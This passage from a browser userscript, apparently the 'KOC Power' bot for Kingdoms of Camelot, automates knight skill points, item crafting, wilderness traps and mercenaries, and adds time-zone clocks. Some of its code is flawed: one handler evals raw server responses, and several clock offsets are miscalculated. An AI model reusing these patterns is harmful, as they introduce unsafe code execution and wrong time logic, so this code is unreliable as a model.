    for (i=row.cells.length-1; i>=1; i--)
      row.deleteCell (i);
    var newCell=row.insertCell(-1);
    newCell.colSpan = 12;
    newCell.align= 'left';
    newCell.style.padding='1px 5px 1px 10px';
    var div = document.createElement ('div');
    div.style.backgroundColor = '#ffffff';
    div.style.textAlign = 'center'; 
    div.style.border = '1px solid';
     div.style.width = '85%';
     div.style.whiteSpace = 'normal';
     newCell.appendChild (div);
	 div.innerHTML = ' '+ unassigned +' '+culang.KTsetpoints+' '+ knightRoles[rid][1] +' '+culang.KTsetpoints1+'';
    }
    t.postSkillPoints (cid, kid, sk[0], sk[1], sk[2], sk[3], function (r){t.postDone(r, div)});  
  },
  
postDone : function (rslt, div){
    var t = Tabs.Ritter;
	var div = document.createElement ('div');
    clearTimeout (t.displayTimer);
    if (rslt.ok){
      div.innerHTML += '<B>'+culang.done+'.</b>';
      t.displayTimer = setTimeout (t.show, 5000);
    } else {
      div.innerHTML += '<BR><SPAN class=boldRed>'+culang.Herror+': '+ rslt.errorMsg +'</span>';
      t.displayTimer = setTimeout (t.show, 10000);
    }
  },

  postSkillPoints: function (cid, kid, pol, com, int, res, notify){
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.cid = cid;
		params.kid = kid;
		params.p = pol;
		params.c = com;
		params.i = int;
		params.r = res;
		    if (DISABLE_POST_KNIGHT_SKILLS){   
      setTimeout (function (){notify({ok:true})}, 1500);
	  return;
	  }
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/skillupKnight.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				if (rslt.ok) {
					var knight = Seed.knights["city" + cid]["knt" + kid];
					var up = pol + com + int + res - knight.politics - knight.combat - knight.intelligence - knight.resourcefulness;
					knight.politics = pol;
					knight.combat = com;
					knight.intelligence = int;
					knight.resourcefulness = res;
					knight.skillPointsApplied = (parseInt(knight.skillPointsApplied) + up).toString();
				}
				if (notify)
					notify (rslt);
			},
			onFailure: function () {
				if (notify)
					notify (rslt);
			},
		});
	},
};
/***********************************************************************************/
/************ KOC POWER - TABS AUTO CRAFTING **************************************/
/*********************************************************************************/
Tabs.AutoCraft = {
	tabOrder: StyleOptions.toCrafting,
	tabLabel: culang.crafting,
	myDiv: null,
	timer: null,
	craftIntervall  : AutoTrainOptions.CraftIntervallMin,
	crafting: [],
	myDiv: null,
	timer: null,
	timerStat: null,
	numcity :-1,

	init: function(div){
        var t = Tabs.AutoCraft;
        t.myDiv = div;   
        t.crafting = {
	            running: AutoTrainOptions.CraftingRunning,
        };
        var m = '<DIV id=pbCraftingDiv class=pdxStat>'+culang.Hacrafting+'</div><TABLE id=pbcraftingfunc width=100% height=0% class=pdxTab><TR><TD width="20%">'+culang.intervall+': <input type=text value="'+AutoTrainOptions.CraftIntervallMin+'" size=2  maxlength=2 id=pbCraftIntervall> '+culang.DFresetsearch2+' <b>(</b><span class=boldRed>'+culang.needRefresh+'</span><b>)</b></td>';
        if (t.crafting.running == false) {
	            m += '<TD  width="50%"><INPUT id=pbCraftRunning type=submit value="'+culang.crafting+' = '+culang.buttonoff+'"></td>';
	 }	        else {
	            m += '<TD width="50%"><INPUT id=pbCraftRunning type=submit value="'+culang.crafting+' = '+culang.buttonon+'"></td>';
	            t.timer=setInterval(t.Start,parseInt(t.craftIntervall*60000));
        }
        m += '<td width="17%"><input type=button value="'+culang.save+'" id="Crafting_Save"></td></tr></table></div>';
        m += '<DIV id=pbCraftingList class=pdxStat>'+culang.Hacraflist+'</div><TABLE id=pbcraftingqueues width=100% height=0% class=pdxTabLined><TR>';

        m += "<td colspan=2><center><b>"+culang.items+"</b></center></td><td><center><b>"+culang.inventar+"</b></center></td><td><b>"+culang.amount+"</b></td></tr>"; 
        
        for(var d=0;d<12;d++) {
         if (d!=2) {
	        var h=parseInt(3000+d);
	        var qte=0;
	        if (parseInt(Seed.items["i"+h])>0) qte=parseInt(Seed.items["i"+h]);
	        m += "<tr><td ><center><img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+ h + ".jpg' width=25></center></td><td><center>"+unsafeWindow.itemlist["i"+h].name+"</center></td><td><center><span class=boldGreen>"+qte+"</span></center></td>";
       	
         	m += "<td><input type=text size=4 id='Craft_nb_"+h+"' value='"+ parseInt(AutoTrainOptions.CraftingNb[h]) +"'></td>";
        m += "";
        	m += "</tr>";
         }
        }
        m+="</table><b>"+culang.impnote+":</b> "+culang.craftNote+" <BR> <b>"+culang.impo+":</b> "+culang.craftImpNote;
          m += '<DIV id=pbCraftingStats class=pdxStat>'+culang.Hacrafstats+'</div><span id="CraftStat"></span>';

       t.myDiv.innerHTML = m;
       
       window.addEventListener('unload', t.onUnload, false);
       
	document.getElementById("Crafting_Save").addEventListener ('click', function (){t.saveCraftState()}, false);
	document.getElementById("pbCraftRunning").addEventListener ('click', function (){t.toggleStateRunning(this)}, false);     
	t.changeCraft ('pbCraftIntervall', 'CraftIntervallMin')
  }, 
  	changeCraft : function (valueId, optionName, callOnChange){
	var t = Tabs.AutoCraft;
	var e = document.getElementById(valueId);
	e.value = AutoTrainOptions[optionName];
	e.addEventListener ('change', eventHandler, false);
	function eventHandler (){
	  AutoTrainOptions[optionName] = this.value;
	  saveAutoTrainOptions();
	  if (callOnChange)
		callOnChange (this.value);
	  }
	},
  updateStat: function() {
   var t = Tabs.AutoCraft;
   var rownum = 0;
   function _row (name, row, noTotal, typee){
         if (rownum++ % 2)
           style = '';
         else
           style = ' style = "background: #e8e8e8"';
         var tot = 0;
         var m = [];
         m.push ('<TR style="background: #fff" align=right');
         m.push (style);
         m.push ('><TD');
         m.push (style);
         m.push ('><B>');
         m.push (name);
         m.push ('</td>');
         if (noTotal){
           m.push ('<TD');
           m.push (style);
           m.push ('>&nbsp;</td>');
         } else {
           for (i=0; i<row.length; i++)
             tot += row[i];
           m.push ('<TD style="background: #ffc">');
            if (tot<0) {
             m.push ("<SPAN class=boldRed>"+addCommas(tot)+"</span>");
            } else {
             m.push (addCommas(tot));
            }
           //}
           m.push ('</td>');
         }
         for (i=0; i<row.length; i++){
           m.push ('<TD');
           m.push (style);
           m.push ('>');
           if (row[i]<50000) {
	                m.push ("<SPAN class=boldRed>"+addCommas(row[i])+"</span>");
	   } else {
	                m.push (addCommas(row[i]));
           }
           m.push ('</td>');
         }
   
         m.push ('</tr>');
         return m.join('');
       }

   clearTimeout(t.timerStat);
   var str="<TABLE class=pdxTabOverview cellpadding=0 cellspacing=0><TR  align=center><TD width=55 align=center></td><TD width=88 style='background: #ffc; font-size:150%' align=center><SPAN class=oohfancy>"+culang.total+"</SPAN></td>";
   for(i=0; i<Cities.numCities; i++) {
            cityID = 'city'+ Cities.cities[i].id;
         
            str += "<TD width=81><SPAN class=oohfancy>"+ Cities.cities[i].name.substring(0,10) +"</SPAN></td>";
          
   }
   rows = [];
   var now = unixTime();
   rows[0] = [];
   for(i=0; i<Cities.numCities; i++) {
          cityID = 'city'+ Cities.cities[i].id;
          rows[0][i] = parseInt(Seed.citystats[cityID].gold[0]);
        }
        for (r=1; r<6; r++){
          rows[r] = [];
          for(i=0; i<Cities.numCities; i++) {
            cityID = 'city'+ Cities.cities[i].id;
            if (r==5)
             rows[r][i] = parseInt(Seed.resources[cityID]['rec'+r][0]);
            else
             rows[r][i] = parseInt(Seed.resources[cityID]['rec'+r][0] / 3600);
            
          }
         
      }
      str += _row ('<img height=18 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/aetherstone_30.png>', rows[5], false, 0);
      str +='<tr style="background: #e8e8e8" align=right><td><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/items/70/3.jpg title="'+culang.crafting+'"></b></td><td>&nbsp;</td>';
                for(i=0; i<Cities.numCities; i++) {
                 var totTime = 0;
                 if (Seed.queue_craft["city" + Cities.cities[i].id].length > 0) {
                  var q=Seed.queue_craft["city" + Cities.cities[i].id][0];
                  var totTime = 0;
                  totTime = q.craftingEtaUnixTime - now;
                  if (totTime < 0)
                    totTime = 0;
                  if (getCityBuilding(Cities.cities[i].id,20).count>0 && totTime == 0)
                    affuichage = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
                  else
                    affuichage = timestr(totTime);
                  
                  str +="<td><span onclick='Crafting("+Cities.cities[i].id+");'>"+ affuichage + "</span></td>";  
           
                 } else {
                 affuichage = timestr(totTime);
                 if (getCityBuilding(Cities.cities[i].id,20).count>0)
                    affuichage = '<SPAN class=boldRed><B>'+ timestr(totTime) +'</b></span>';
                    
                 str +="<td><span onclick='Crafting("+Cities.cities[i].id+");'>"+affuichage+"</span></td>";
                 }
                }    
             str +="</tr>";    
             
         document.getElementById("CraftStat").innerHTML=str;
         t.timerStat = setTimeout(function() { t.updateStat(); }, 2000);
         
         
  },
  updateCraftnb : function() {
   var t = Tabs.AutoCraft;
   for(var d=0;d<12;d++) {
    var h=parseInt(3000+d);
     if (document.getElementById("Craft_nb_" +h)) {
      document.getElementById("Craft_nb_"+h).value=parseInt(AutoTrainOptions.CraftingNb[h]) ;
      }
   
   }
  },
  saveCraftState : function() {
   var t = Tabs.AutoCraft;
   AutoTrainOptions.CraftingRunning =  t.crafting.running;
    for(var d=0;d<12;d++) {
      var h=parseInt(3000+d);
      if (document.getElementById("Craft_nb_" +h)) AutoTrainOptions.CraftingNb[h] = document.getElementById("Craft_nb_"+h).value;
    }
    saveAutoTrainOptions();
  },
  toggleStateRunning: function(obj){
  	var t = Tabs.AutoCraft;
  	obj = document.getElementById('pbCraftRunning');
          if (t.crafting.running == true) {
              t.crafting.running = false;
              t.saveCraftState();
              if (obj) obj.value = culang.crafting+" = "+culang.buttonoff;
              clearInterval(t.timer);
          }
          else {
              t.crafting.running = true;
              t.saveCraftState();
              if (obj) obj.value = culang.crafting+" = "+culang.buttonon;
              t.timer=setInterval(t.Start,parseInt(t.craftIntervall*60000));
			  t.Start();
          }
          t.updateCraftnb();
    },
    Start: function() {
     var t = Tabs.AutoCraft;
     if(!AutoTrainOptions.CraftingRunning) {
      clearInterval(t.timer);
      return;
     }
     if (t.numcity<Cities.numCities-1) {
           t.numcity++;
         } else {
          t.numcity=0; 
     }
     var c=t.numcity;
     var cityId=Cities.cities[c].id;
     
     var ret=getCityBuilding(cityId,20).count;
     if (ret==0) { // pas de fleche de fey
       t.Start();
       return;
     }
     if (parseInt(Seed.resources["city" + cityId]['rec5'][0])<50000) 
            return;
     var tableau = [];
     for(var d=0;d<12;d++) {
           var h=parseInt(3000+d);
           if (parseInt(AutoTrainOptions.CraftingNb[h])>0) {
            tableau.push (h);
           }
     }
     var itemId = tableau[Math.floor(Math.random()*tableau.length)] 
     var recipeId = parseInt(itemId) - 3000 + 1;
     var i=Seed.queue_craft["city"+cityId];
     if(i.length>0) {
          var q=i[0];
     	  var totTime = 0;
     	  var now = unixTime();
          totTime = q.craftingEtaUnixTime - now;
          if (totTime > 0) {
           return;
          }
     } 
     t.CraftingItem(cityId,  itemId, recipeId);
    },
    CraftingItem: function (currentcity, itemId, recipeId) {
      var t = Tabs.AutoCraft;
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
          params.action="craft";
          params.ctrl="Crafting";
          params.cityId=currentcity;
          params.insurance=false;
     	  params.itemId=itemId;
     	  params.recipeId=recipeId;
     	  params.categoryId=1;
      new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, { method: "post", parameters: params,loading: true,
          onSuccess: function (transport) {
              var o=eval("("+transport.responseText+")");
              if(o.ok===true){
               if (o.status=="error") {
			   
               } else if(o.status=="failure"){
    	        setTimeout(function() {
    	         t.CraftingItem(currentcity,  itemId, recipeId);
    	        }, 5000);
     	       } else if (o.status=="success"){
				//actionLog ('<b>'+culang.auto+' '+culang.crafting+'</b>:  <span class=boldGreen>OK</span> #'+ (AutoTrainOptions.CraftingNb[itemId] -1)+' ');
     	        AutoTrainOptions.CraftingNb[itemId] =  AutoTrainOptions.CraftingNb[itemId] -1;
     	        saveAutoTrainOptions();
     	        t.updateCraftnb();
       		if(!Seed.queue_craft["city"+currentcity]) {
    		 Seed.queue_craft["city"+currentcity]=[];
    		}
         	var n={};
         	n.recipeId=recipeId;
         	n.craftingUnixTime=o.time.startTime;
         	n.craftingEtaUnixTime=o.time.endTime;
         	n.craftingId=o.craftingId;
         	n.categoryId=null;
         	n.recipeIndex=null;
         	unsafeWindow.seed.queue_craft["city"+currentcity].push(n);
         	t.Start()
               }
              }
            },
            onFailure: function () {    }
       });
 },
    show : function (){
		var t = Tabs.AutoCraft;
		mainPop.div.style.width = 850 + 'px';
		if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
		clearTimeout(t.timerStat);
		t.updateStat();
    },
    hide: function(){
		var t = Tabs.AutoCraft;
		mainPop.div.style.width = 850 + 'px';
		if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
		clearTimeout(t.timerStat);
      },
	  onUnload: function(){
		  var t = Tabs.AutoCraft;
		   t.saveCraftState();
    },
};
/***********************************************************************************/
/************ KOC POWER - TABS WILDS **********************************************/
/*********************************************************************************/
var wildNames = {
   0: ''+culang.bog+'',
  10: ''+culang.grassland+'',
  11: ''+culang.rptlake+'',
  20: ''+culang.forests+'',
  30: ''+culang.rpthill+'',
  40: ''+culang.rptmount+'',
  50: ''+culang.rptplain+'',
};
var mercNames = {
  0: ''+culang.NoneHired+'',
  1: ''+culang.novices+'',
  2: ''+culang.intermediates+'',
  3: ''+culang.veterans+'',
};
Tabs.Wilds = {
  tabLabel : culang.wild,
  tabOrder : StyleOptions.toWildnisse,
  tabDisabled : StyleOptions.disWildTab, 
  cont : null,
  upGoldTimer : null,
  wildList : [],
  buildList : {},
  
  init : function (div){
    var t = Tabs.Wilds;
    t.cont = div;
    unsafeWindow.ptButMaxTraps = t.e_butMaxTraps;
    unsafeWindow.ptInpWildTraps = t.e_inpTraps;
    unsafeWindow.ptButWildSet = t.e_butWildSet;
    t.cont.innerHTML = '<DIV id=wildContent style="maxheight:720px; height:700px; overflow-y:auto">';
  },

  hide : function (){
    var t = Tabs.Wilds;
    clearTimeout (t.upGoldTimer);
     mainPop.div.style.width = 850 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  show : function (){
    var t = Tabs.Wilds;
	mainPop.div.style.width = 850 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
    clearTimeout (t.upGoldTimer);
    if (t.state == null){
      t.cont.innerHTML = '<div class=pdxStat>'+culang.HwildS+'</div><DIV id=wildContent style="maxheight:720px; height:720px; overflow-y:auto">';
      t.state = 1;
    }
    
    m = '<CENTER>'+ strButton20(''+culang.Hreset+'', 'id=ptwref') +'</center><TABLE cellspacing=0 cellpadding=0 class=pdxTabPad align=center>';
    for (var c=0; c<Cities.numCities; c++){
      var city = Cities.cities[c];
      t.wildList[c] = [];    
      
      var totWilds = 0;
      var datw = Seed.wilderness['city'+ city.id];
      if (datw!=null && matTypeof(datw)=='object')
       for (k in datw)
        ++totWilds;
      var nivcastle = parseInt(Seed.buildings['city'+ city.id].pos0[1]);
              var castle = nivcastle;
              if (nivcastle==11) castle=12; 
        if (nivcastle==12) castle=14; 
      if (totWilds < castle)  {
        var totWildsstring = '<SPAN style="font-color:red"><B>'+ totWilds +'/'+ castle +'</b></span>';
      }else{
          var totWildsstring = totWilds +'/'+ castle;
      }
      
      
      m += '<TR><TD colspan=20><DIV class=pdxStat>'+ city.name +' &nbsp; ('+ city.x +','+ city.y +') - '+totWildsstring+'</div></td></tr>';
      var row = 0;  
      var sortem = [];
      
      var cWilds = Seed.wilderness['city'+city.id];
      if (matTypeof(cWilds) != 'array') {
        m += '<TR style="font-weight:bold;" align=right><TD align=left> '+culang.pTcwild+' </td><TD></td><TD align=left style="padding-left:3px">'+culang.coord+' </td><TD style="padding-left:8px"> '+culang.trap+' </td><TD align=left style="padding-left:16px"> '+culang.mercenaries+' </td>\
         <TD width=15></td><TD colspan=3 class=pdxEntry>'+ htmlTitleLine(' '+culang.Hdefense+' ') +'</td></tr>';
        for (var k in Seed.wilderness['city'+city.id])
          sortem.push (Seed.wilderness['city'+city.id][k]);
        sortem.sort (function (a,b){
          var x; if ((x = b.tileLevel-a.tileLevel)!=0) 
            return x; 
          return a.tileType-b.tileType;
        });
        for (i=0; i<sortem.length; i++){
          var wild = sortem[i]; 
          var wildDef = Seed.wildDef['t'+wild.tileId];
          if (wildDef==undefined || !wildDef)
            wildDef = {fort60Count:0, mercLevel:0};
          var maxTraps = parseInt(wild.tileLevel)*100;
          var maxBuild = maxTraps - parseInt(wildDef.fort60Count);
          t.wildList[c][i] = [wild.tileId, maxBuild];          
          m += '<TR align=right'+ (row++%2?'':' class=ptOddrow') +'><TD align=left><a onclick="citysel_click(document.getElementById(\'citysel_'+ (c+1)+'\'));setTimeout (function (){modal_wilderness_abandon('+wild.tileId+','+ wild.tileLevel +','+wild.tileType+','+ wild.xCoord +','+ wild.yCoord +');setTimeout(function(){ ptButWildShow(this); },4000);},500);return false;"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.abdonewild+'"></a>&nbsp;'+ wildNames[wild.tileType] +'</td>\
            <TD>'+ wild.tileLevel +'</td><TD align=center>\
			'+pdxkoordlink(wild.xCoord,wild.yCoord)+'</td>\
            <TD align=right><B>'+ wildDef.fort60Count +'</b></td><TD align=center><B>'+ mercNames[wildDef.mercLevel] +'</b></td>\
            <TD></td><TD align=left class=pdxEntry><B>'+culang.trap+':</b> <INPUT onchange="ptInpWildTraps(this)" id=ptwt_'+ c +'_'+ i 
              + (maxBuild==0?' DISABLED ':'')+' style="margin:0px; padding:0px" type=text size=3 maxlength=4></td>'
          if (wildDef.fort60Count < maxTraps)
            m += '<TD class=pdxEntry style="padding:0px">'+ strButton14(''+culang.max+'', 'id=ptwx_'+ c +'_'+ i +' onclick="ptButMaxTraps(this)"') +'</td>';
          else
            m += '<TD class=pdxEntry></td>';
          m += '<TD class=pdxEntry> &nbsp; &nbsp; <B>'+culang.mercenaries+':</b> ' + htmlSelector(mercNames, wildDef.mercLevel, 'id=ptwm_'+ c +'_'+ i) +' &nbsp; &nbsp; </td></tr>';
        }
        m += '<TR><TD colspan=6></td><TD class=pdxEntry align=center colspan=3><TABLE><TR><TD width=40% align=left>'+culang.salary+': <SPAN id=ptwgc_'+ c +'>0</span></td>\
            <TD width=10%>'+ strButton20(""+culang.save+"", 'onclick="ptButWildSet('+ c +')"') +'<TD width=40% align=right>'+culang.gold+': <SPAN id=ptwgt_'+ c +'>0</span></td></td></tr></table></td></tr>';
      } else {
        m+= '<TR><TD colspan=9> &nbsp; </td></tr>';
      }         
    }
    document.getElementById('wildContent').innerHTML = m + '</table></div>';
    document.getElementById('ptwref').addEventListener ('click', t.show, false);
    t.updateGold ();
  },

  e_butWildSet : function (c){
    var t = Tabs.Wilds;
    var totTraps = 0;  
    var cid = Cities.cities[c].id;
    t.buildList = {cityId:cid, list:[]};
          
    for (var w=0; w<t.wildList[c].length; w++){
      var wild = Seed.wilderness['city'+cid]['t'+t.wildList[c][w][0]]; 
      var wildDef = Seed.wildDef['t'+t.wildList[c][w][0]];
      // TODO: Seed.wildDef is null if just aquired 
      if (wildDef==undefined || !wildDef)
        wildDef = {fort60Count:0, mercLevel:0};
    
      var numTraps = parseInt(document.getElementById('ptwt_'+ c +'_'+ w).value, 10);
      if (isNaN(numTraps))
        numTraps = 0;
      totTraps += numTraps;
      if (numTraps > 0)
        t.buildList.list.push (['T', wild.tileId, numTraps]);
      var mercId =document.getElementById('ptwm_'+ c +'_'+ w).value; 
      if (wildDef.mercLevel != mercId)
        t.buildList.list.push (['M', wild.tileId, mercId, wildDef.mercLevel]);
    }

    var totCost = totTraps * 200; 
    if (totCost > parseInt(Seed.citystats['city'+cid].gold[0])){
      document.getElementById('ptwgc_'+ c).innerHTML = '<SPAN class=boldRed>'+ addCommasInt(totCost) +'</span>';
      return; 
    }
    if (t.buildList.list.length == 0)
      return;
    t.setCurtain (true);
    var popDiv = t.setPopup (true);
    popDiv.innerHTML = '<TABLE class=pdxTab width=100% height=100%><TR><TD>\
          <DIV class=pdxStat>'+culang.HsetTrp+'</div>\
          <DIV id=ptWildBuildDiv class=ptDiv style="padding:10px; height:225px; max-height:225px; overflow-y:auto"></div>\
          </td></tr><TR><TD align=center>'+ strButton20(''+culang.close+'', 'id=ptWildCancel') +'</td></tr></table>';
    document.getElementById('ptWildCancel').addEventListener('click', t.e_buildCancel, false);
    t.processQue(null);  
  },
  
  e_buildCancel : function (){
    var t = Tabs.Wilds;
    t.setCurtain(false);
    t.setPopup(false);
    t.show();
  },
  
  processQue : function (errMsg){
    var t = Tabs.Wilds;
    var what = t.buildList.list.shift();
    var div = document.getElementById('ptWildBuildDiv');
    if (what==null || errMsg){
      if (errMsg)
        div.innerHTML += '<BR><SPAN style="white-space:normal;" class=boldRed>'+culang.Herror+': '+ errMsg +'</span>';
      else
        div.innerHTML += '- <span class=boldGreen>'+culang.done+'!</span><BR>';
      document.getElementById('ptWildCancel').firstChild.innerHTML = ''+culang.close+''; 
      return;
    }
    if (div.innerHTML != '')
      div.innerHTML += '- <span class=boldGreen>'+culang.done+'!</span><BR>';
    var wild = Seed.wilderness['city'+ t.buildList.cityId]['t'+what[1]];
    if (what[0] == 'T'){
      div.innerHTML += ''+culang.TTbuildque+' <b>'+ what[2] +'</b> '+culang.traps+' '+culang.forc+' '+ Cities.byID[t.buildList.cityId].name +'\'s '+culang.pTcwild+' '+pdxkoordlink(wild.xCoord,wild.yCoord)+'  ';
      t.postBuyTraps (t.buildList.cityId, what[1], what[2], t.processQue);
    } else {
      div.innerHTML += '<b>'+ mercNames[what[2]] +'</b> '+culang.forc+' '+culang.pTcwild+' '+pdxkoordlink(wild.xCoord,wild.yCoord)+' '+culang.at+' '+ Cities.byID[t.buildList.cityId].name +' '+culang.recru+'';
      t.postHireMercs (t.buildList.cityId, what[1], what[2], what[3], t.processQue);
    }
  },
  
  setPopup : function (onoff){
    var t = Tabs.Wilds;
    if (onoff){
      var div = document.createElement('div');
      div.id = 'ptWildPop';
      div.style.backgroundColor = '#fff';
	  div.style.zindex = mainPop.div.zIndex+2;
      //div.style.zindex = mainPop.getZindex()+2;
      div.style.opacity = '1';
      div.style.border = '3px outset red';
      div.style.width = '600px';
      div.style.height = '500px';
      div.style.display = 'block';
      div.style.position = 'absolute';
      div.style.top = '100px';
      div.style.left = '100px';
      t.cont.appendChild (div);
      return div;
    } else {
      t.cont.removeChild (document.getElementById('ptWildPop'));
    }
  },

  setCurtain : function (onoff){
    var t = Tabs.Wilds;
    if (onoff){
      var off = getAbsoluteOffsets (t.cont);
      var curtain = document.createElement('div');
      curtain.id = 'ptWildCurtain';
	  curtain.style.zindex = mainPop.div.zIndex+1;
      //curtain.style.zindex = mainPop.getZindex()+1;
      curtain.style.backgroundColor = "#000000";
      curtain.style.opacity = '0.5';
      curtain.style.width = t.cont.clientWidth +'px';
      curtain.style.height = t.cont.clientHeight +'px';
      curtain.style.display = 'block';
      curtain.style.position = 'absolute';
      curtain.style.top = off.top + 'px';
      curtain.style.left = off.left + 'px';
      t.cont.appendChild (curtain);
    } else {
      t.cont.removeChild (document.getElementById('ptWildCurtain'));
    }
  },
  
  e_butMaxTraps : function (e){
    var t = Tabs.Wilds;
    var c = e.id.substr(5,1);
    var w = e.id.substr(7);
    var inp = document.getElementById('ptwt_'+ c +'_'+ w);
    inp.value = t.wildList[c][w][1];
    t.e_inpTraps (inp);
  },
  
  e_inpTraps : function (e){
    var t = Tabs.Wilds;
    var c = e.id.substr(5,1);
    var w = e.id.substr (7);
    var tot = 0;
    for (var i=0; i<t.wildList[c].length; i++) {
      var val = parseInt(document.getElementById('ptwt_'+ c +'_'+ i).value, 10);
      if (isNaN(val))
        val = 0;
      tot += val;
    }  
    document.getElementById('ptwgc_'+ c).innerHTML = addCommasInt(tot * 200);
    if (isNaN(e.value) || e.value<0 || e.value>t.wildList[c][w][1]){
      e.value = '';
      e.style.backgroundColor = '#ffaaaa';
    } else
      e.style.backgroundColor = null;
  },

  updateGold : function (){
    var t = Tabs.Wilds;
    for (var c=0; c<Cities.numCities; c++){
      var e = document.getElementById('ptwgt_'+ c +'');
      if (e)
        e.innerHTML = addCommasInt(Seed.citystats['city'+Cities.cities[c].id].gold[0]);
    }
    t.upGoldTimer = setTimeout (t.updateGold, 2000);
  },
  
  postBuyTraps : function (cid, tid, quant, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = cid;
    params.tid = tid;
    params.quant = quant;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/buyWildTraps.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (rslt.ok){
         if (!Seed.wildDef["t"+ tid])
          Seed.wildDef["t"+ tid] = {tileId:tid, fort60Count:0, mercLevel:0};
          Seed.wildDef["t"+ tid].fort60Count = parseInt(Seed.wildDef["t"+ tid].fort60Count) + parseInt(quant);
         }  
         if (notify)
          notify (rslt.errorMsg);
      },
      onFailure: function () {
        if (notify)
          notify ('AJAX '+culang.Herror+'');
      },
    });
  },

  postHireMercs : function (cid, tid, newLevel, oldLevel, notify){

    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = cid;
    params.tid = tid;
    params.lv = newLevel;
    params.olv = oldLevel;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/hireWildMerc.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (rslt.ok){
          if (!Seed.wildDef["t"+ tid])
            Seed.wildDef["t"+ tid] = {tileId:tid, fort60Count:0, mercLevel:0};
          Seed.wildDef["t"+ tid].mercLevel = newLevel;
        }
        if (notify)
          notify (rslt.errorMsg);
      },
      onFailure: function () {
        if (notify)
          notify ('AJAX '+culang.Herror+'');
      },
    });
  },
          
}
/***********************************************************************************/
/************ KOC POWER - TABS OPTIONS ********************************************/
/*********************************************************************************/
if (Options.pdxTimeZones=="noneTimeZone") { var noTimeZone = { init : function () {  var t = noTimeZone;  }, } }			 
if (Options.pdxTimeZones=="gmtTimeZone") {
var gmtClock = {
  span : null,
  timer : null,
  
  init : function (){
  var t = gmtClock;
    t.span = document.createElement ('span');
    t.span.style.fontWeight = 'bold';
	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);
    t.setEnable (Options.pdxTimeZones=="gmtTimeZone");
  },

  setEnable : function (tf){
    var t = gmtClock;
    clearInterval (t.timer);
    if (tf){
      t.timer = setInterval (t.everySecond, 900);
    } else {
      t.span.innerHTML = '';
    }
  },
    
  everySecond : function (){
 var t = gmtClock;
    var now = new Date();  
    now.setTime(now.getTime() + (now.getTimezoneOffset()*60000));
    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';
  },
 }
}
if (Options.pdxTimeZones=="pstTimeZone") {
var pstClock = {
  span : null,
  timer : null,
  
  init : function (){
  var t = pstClock;
    t.span = document.createElement ('span');
    t.span.style.fontWeight = 'bold';
	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);
    t.setEnable (Options.pdxTimeZones=="pstTimeZone");
  },

  setEnable : function (tf){
    var t = pstClock;
    clearInterval (t.timer);
    if (tf){
      t.timer = setInterval (t.everySecond, 900);
    } else {
      t.span.innerHTML = '';
    }
  },
    
  everySecond : function (){
 var t = pstClock;
    var now = new Date();  
    now.setTime(now.getTime() + (now.getTimezoneOffset()*540000));
    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';
  },
}
}
// CEST CLOCK
if (Options.pdxTimeZones=="cestTimeZone") {
var cestClock = {
  span : null,
  timer : null,  
  init : function (){
  var t = cestClock;
    t.span = document.createElement ('span');
    t.span.style.fontWeight = 'bold';
	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);
    t.setEnable (Options.pdxTimeZones=="cestTimeZone");


  },
  setEnable : function (tf){
    var t = cestClock;
    clearInterval (t.timer);
    if (tf){
      t.timer = setInterval (t.everySecond, 900);
    } else {
      t.span.innerHTML = '';
    }
  },
  everySecond : function (){
  var t = cestClock;
    var now = new Date();  
    now.setTime(now.getTime() + (now.getTimezoneOffset()*0));
    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';
  },
 }
}
if (Options.pdxTimeZones=="estTimeZone") {
var estClock = {
  span : null,
  timer : null,
  init : function (){
  var t = estClock;
    t.span = document.createElement ('span');
    t.span.style.fontWeight = 'bold';
	document.getElementById('pdxTimeZone').parentNode.appendChild (t.span);
    t.setEnable (Options.pdxTimeZones=="estTimeZone");
  },

  setEnable : function (tf){
    var t = estClock;
    clearInterval (t.timer);
    if (tf){
      t.timer = setInterval (t.everySecond, 900);
    } else {
      t.span.innerHTML = '';
    }
  },
    
  everySecond : function (){
  var t = estClock;
    var now = new Date();  
    now.setTime(now.getTime() + (now.getTimezoneOffset()*180000));
    t.span.innerHTML = ' '+ now.toLocaleFormat('%H:%M:%S') +'';
  },
}
}

Tabs.Options = {
  tabLabel : culang.options,
  tabOrder: StyleOptions.toEinstellung,
  myDiv : null,
  fixAvailable : {},
  displayTimer:null,
  curTabBut : null,
  curTabName : null,

  init : function (div){
    var t = Tabs.Options;
	
	var chat = document.getElementById('kocmain_bottom').childNodes[1];
	 if (chat) {
	 var channel_input = nHtml.FindByXPath(chat,".//div[contains(@class,'mod_comm_forum')]");
	 logit(channel_input);
	 var ab = document.createElement('a');
